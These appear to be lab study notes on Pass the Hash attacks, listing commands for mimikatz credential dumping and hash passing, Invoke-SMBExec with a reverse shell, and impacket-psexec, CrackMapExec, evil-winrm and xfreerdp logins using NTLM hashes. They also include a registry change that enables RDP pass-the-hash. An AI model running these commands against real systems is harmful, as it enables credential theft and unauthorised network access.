# Pass the Hash

## Minikatz (Windows)

```
mimikatz.exe privilege::debug "sekurlsa::logonPasswords full" exit
```

get dump of all hashes

```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:$username /rc4:$rc4hash /domain:inlanefreight.htb /run:cmd.exe" exit
```


`/rc4` or = `/NTLM` - NTLM hash of the user's password

[https://github.com/gentilkiwi](https://github.com/gentilkiwi)

## with PowerShell Invoke-TheHash (Windows)

attacks with WMI and SMB

Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer

```powershell
Invoke-SMBExec -Target $IP -Domain inlanefreight.htb -Username $username-Hash $hash -Command "reverse shell"
```


nc listener

we get cmd.exe of that user
![[image 44.png]]


# Q. Which IP to give in reverse shell????

[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

# with Impacket (Linux)

<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
</strong></code></pre>
![[image 1 3.png]]


There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, such as:

* [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
* [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

## with CrackMapExec (Linux)


```shell-session
crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```


## with evil-winrm (Linux)


```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```



> [!NOTE]
> - [ ] **Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb**

## with RDP (Linux)

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
![[image 2 2.png]]

### **Enable Restricted Admin Mode to Allow PtH**

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


this on first machine (MS01) to go at DC01
![[image 3 2.png]]

### **Pass the Hash Using RDP**

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B /cert-ignore /timeout:60000
```



> [!NOTE]
> > Note: There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.

